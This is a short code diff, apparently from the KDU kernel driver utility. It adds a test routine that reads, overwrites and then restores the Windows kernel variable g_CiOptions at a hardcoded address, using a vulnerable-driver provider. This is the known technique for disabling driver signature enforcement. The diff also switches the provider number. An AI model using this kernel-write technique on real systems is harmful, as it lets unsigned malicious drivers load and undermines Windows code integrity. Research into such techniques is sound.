@@ -47,6 +47,21 @@ VOID KDUTestLoad()
     }
 }
 
+VOID KDUTestDSE(PKDU_CONTEXT Context)
+{
+    ULONG_PTR g_CiOptions = 0xfffff805fc446d18;
+    ULONG_PTR oldValue = 0, newValue = 0x1337, testValue = 0;
+
+    KDUReadKernelVM(Context, g_CiOptions, &oldValue, sizeof(oldValue));
+    Beep(0, 0);
+    KDUWriteKernelVM(Context, g_CiOptions, &newValue, sizeof(newValue));
+    Beep(0, 0);
+    KDUReadKernelVM(Context, g_CiOptions, &testValue, sizeof(testValue));
+    if (testValue != newValue)
+        Beep(1, 1);
+    KDUWriteKernelVM(Context, g_CiOptions, &oldValue, sizeof(oldValue));
+}
+
 VOID KDUTest()
 {
     PKDU_CONTEXT Context;
@@ -56,8 +71,10 @@ VOID KDUTest()
 
     RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
 
-    Context = KDUProviderCreate(15, FALSE, 7601, KDU_SHELLCODE_V1, ActionTypeMapDriver);
+    Context = KDUProviderCreate(16, FALSE, 7601, KDU_SHELLCODE_V1, ActionTypeMapDriver);
     if (Context) {
+
+        KDUTestDSE(Context);
 
         //ULONG64 dummy = 0;
 
